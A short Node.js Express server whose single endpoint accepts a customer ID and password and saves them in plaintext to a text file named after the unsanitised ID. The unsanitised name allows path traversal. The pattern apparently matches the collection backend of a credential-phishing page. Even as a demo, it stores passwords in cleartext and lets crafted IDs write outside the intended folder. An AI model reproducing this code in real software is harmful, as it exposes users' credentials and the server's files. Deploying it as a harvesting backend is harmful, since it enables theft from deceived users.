const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static('public')); // Serve static files (HTML, CSS, JS)

// Ensure the "database" folder exists
const dbFolder = path.join(__dirname, 'database');
if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder);
}

// Endpoint to handle user data submission
app.post('/submit-data', (req, res) => {
    const { customerId, password } = req.body;

    if (!customerId || !password) {
        return res.status(400).json({ success: false, message: 'Customer ID and Password are required!' });
    }

    // Create a unique file for each customer
    const fileName = `${customerId}.txt`;
    const filePath = path.join(dbFolder, fileName);

    // File content
    const fileContent = `Customer ID: ${customerId}\nPassword: ${password}\nSubmitted on: ${new Date().toLocaleString()}`;

    // Write the file
    fs.writeFile(filePath, fileContent, (err) => {
        if (err) {
            console.error('Error writing file:', err);
            return res.status(500).json({ success: false, message: 'Failed to save data.' });
        }

        // Log the saved file's location
        console.log(`Data saved at: ${filePath}`);

        console.log('Successfully saved data for:', customerId); // Optional extra logging
        res.json({ success: true, message: `Data saved in ${fileName}!` });
    });
});

// Fallback route for undefined routes
app.use((req, res) => {
    res.status(404).send('404 Not Found');
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
